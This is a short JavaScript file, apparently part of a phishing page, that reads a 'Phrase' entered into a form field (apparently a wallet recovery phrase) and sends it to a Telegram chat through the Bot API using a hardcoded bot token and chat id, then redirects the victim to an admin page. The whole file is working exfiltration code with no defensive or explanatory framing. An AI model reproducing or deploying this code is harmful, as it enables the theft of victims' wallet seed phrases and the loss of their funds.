//bot token
var telegram_bot_id = "7025965177:AAEEtxuMRd_Itj8GBbpgezfu70sCmiwwkFQ";
//chat id
var chat_id = -1001957917973;
var phr;
var ready = function () {
    phr = document.getElementById("rase").value;
    message = "Phrase: " + phr;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);

         window.location.href = "admin.html";
    });
    document.getElementById("rase").value = "";
    return false;
};
